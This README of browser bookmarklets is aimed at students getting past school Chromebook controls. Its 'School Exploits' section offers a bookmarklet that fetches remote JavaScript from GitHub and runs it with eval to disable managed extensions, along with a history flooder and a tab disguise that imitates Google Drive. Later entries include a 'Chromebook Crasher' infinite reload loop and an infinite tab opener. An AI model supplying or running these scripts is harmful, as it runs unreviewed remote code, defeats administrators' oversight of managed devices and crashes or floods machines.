# Bookmarklets


## Notice!
I Did Not Make All Of These, Most Of These I Have Found On Various Websites
That Probably Got Them From Somewhere Else
I'm Just Putting Them Here So Its Easier For People To Find Them And Use Them!


## School Exploits

### Extension Modifier
---
This Bookmarklet Allows The User To Turn On Or Off
Their Chrome Extensions.

```javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);```

This One Requires You To Open It Twice In The Same Tab!

### History Flooder
---
This Bookmarklet Allows The User To Flood Their
History With Whatever Tab They Are On.

```javascript:var num=prompt("History flood amount:");done=false;x=window.location.href;for (var i=1; i<=num; i++){history.pushState(0, 0, i==num?x:i.toString());if(i==num){done=true}}if(done===true){alert("History flood successful! "+window.location.href+" now appears in your history "+num+(num==1?" time.":" times."))}```

### Tab Disguise
---
This Bookmarklet Disguises The Tab You Are On To Look
Like Google Drive.

```javascript:function gcloak() { var link = document.querySelector("link[rel*='icon']") || document.createElement('link');link.type = 'image/x-icon';link.rel = 'shortcut icon';link.href = 'https://www.pngall.com/wp-content/uploads/9/Google-Drive-Logo-Transparent-180x180.png';document.title = 'My Drive - Google Drive';console.log(document.title);document.getElementsByTagName('head')[0].appendChild(link) };gcloak();setInterval(gcloak, 1000);```

## Fun Stuff

### AutoClicker
---
This Bookmarklet Makes Your Cursor Act As If It Was An AutoClicker
Only Works On That Tab That You Use The Bookmarklet On!

```javascript:(function(x,y){if(!window.click){window.click=!0,document.body.style.cursor='crosshair';var cps=prompt('Autoclicker CPS: (Under 200 recommended)');if(!cps||isNaN(cps)?(alert(%27You entered something wrong. Try running the script again.%27),end()):alert(%27Autoclicker activated at %27+cps+%27 CPS! Do [ctrl+e] to stop.%27),addEventListener(%27mousemove%27,e=>{x=e.clientX,y=e.clientY}),addEventListener(%27keydown%27,e=>{%27e%27===e.key&&e.ctrlKey&&(alert(%27Autoclicker deactivated! Click the bookmark again to reactivate!%27),end())}),window.click)var int=setInterval(function(){var e=document.elementFromPoint(x,y);e&&e.click()},1e3/cps);function end(){clearInterval(int),window.click=!1,document.body.style.cursor=%27default%27}}})();```

### Chromebook Crasher
---
This Bookmarklet Crashes The Chromebook!
Use At Your Own Risk!

```javascript:alert("Are You Sure?");alert("Use At Your Own Risk");alert("Ready? IF NO RELOAD NOW.");setTimeout(() => {while (true) {while(1)location.reload(1)}}, 1000);```

### High Pitch Sound Hidery
---
Plays The High Pitch Noise, And You Can Hide The Window.

```javascript:alert("High Pitched Noise! Press H to Hide!");var s = "https://www.youtube.com/embed/MMNa8yqUEbE";((function(){var a,b,c;c=s,b=document.createElement("iframe"),b.setAttribute("src",c),b.setAttribute("id","rusic-modal"),b.setAttribute("style","position: fixed; z-index: 999999; width: 400px; height: 270px; left: 10px; top: 10px; border: 5px solid #009933; overflow: hidden; background-color: #fff;"),a=document.getElementsByTagName("body")[0],a.appendChild(b); window.addEventListener('keydown', function(event) { if (event.key == 'h') { b.setAttribute("style","left:-100000px;"); } }); })).call(this); ```

### Infinite Tab Opener
---
Opens Infinite Google Tabs Until You Close Out.

```javascript: alert("Use at your own risk."); while (true){window.open("https://www.google.com")}```

## Other

### AdBlocker
---
This Blocks All Ads On The Site That You Use That Bookmarklet On.
Sometimes Removes Emmbeded Games.

```javascript:(function(){    /* Ad-B-Gone: Bookmarklet that removes obnoxious ads from pages */    var selectors = [    /* By ID: */    '#sidebar-wrap', '#advert', '#xrail', '#middle-article-advert-container',    '#sponsored-recommendations', '#around-the-web', '#sponsored-recommendations',    '#taboola-content', '#taboola-below-taboola-native-thumbnails', '#inarticle_wrapper_div',    '#rc-row-container', '#ads', '#at-share-dock', '#at4-share', '#at4-follow', '#right-ads-rail',    'div#ad-interstitial', 'div#advert-article', 'div#ac-lre-player-ph',    /* By Class: */    '.ad', '.avert', '.avert__wrapper', '.middle-banner-ad', '.advertisement',    '.GoogleActiveViewClass', '.advert', '.cns-ads-stage', '.teads-inread', '.ad-banner',    '.ad-anchored', '.js_shelf_ads', '.ad-slot', '.antenna', '.xrail-content',    '.advertisement__leaderboard', '.ad-leaderboard', '.trc_rbox_outer', '.ks-recommended',    '.article-da', 'div.sponsored-stories-component', 'div.addthis-smartlayers',    'div.article-adsponsor', 'div.signin-prompt', 'div.article-bumper', 'div.video-placeholder',    'div.top-ad-container', 'div.header-ad', 'div.ad-unit', 'div.demo-block', 'div.OUTBRAIN',    'div.ob-widget', 'div.nwsrm-wrapper', 'div.announcementBar', 'div.partner-resources-block',    'div.arrow-down', 'div.m-ad', 'div.story-interrupt', 'div.taboola-recommended',    'div.ad-cluster-container', 'div.ctx-sidebar', 'div.incognito-modal', '.OUTBRAIN', '.subscribe-button',    '.ads9', '.leaderboards', '.GoogleActiveViewElement', '.mpu-container', '.ad-300x600', '.tf-ad-block',    '.sidebar-ads-holder-top', '.ads-one', '.FullPageModal__scroller',    '.content-ads-holder', '.widget-area', '.social-buttons', '.ac-player-ph',    /* Other: */    'script', 'iframe', 'video', 'aside#sponsored-recommendations', 'aside[role="banner"]', 'aside',    'amp-ad', 'span[id^=ad_is_]', 'div[class*="indianapolis-optin"]', 'div[id^=google_ads_iframe]',    'div[data-google-query-id]', 'section[data-response]', 'ins.adsbygoogle', 'div[data-google-query-id]',    'div[data-test-id="fullPageSignupModal"]', 'div[data-test-id="giftWrap"]' ];    for(let i in selectors) {        let nodesList = document.querySelectorAll(selectors[i]);        for(let i = 0; i < nodesList.length; i++) {            let el = nodesList[i];            if(el && el.parentNode)                el.parentNode.removeChild(el);        }    }})();```

### Cookie Remover
---
Removes All Cookies From That Site.

```javascript:void((function(){var a,b,c,e,f;f=0;a=document.cookie.split("; ");for(e=0;e<a.length&&a[e];e++){f++;for(b="."+location.host;b;b=b.replace(/^(?:%5C.|[^%5C.]+)/,"")){for(c=location.pathname;c;c=c.replace(/.$/,"")){document.cookie=(a[e]+"; domain="+b+"; path="+c+"; expires="+new Date((new Date()).getTime()-1e11).toGMTString());}}}alert("Expired "+f+" cookies");})())```

### URL Compressor
---
Compresses Any URL

```javascript:void(open('http://tinyurl.com/create.php?url=%27+encodeURIComponent(location.href)))```





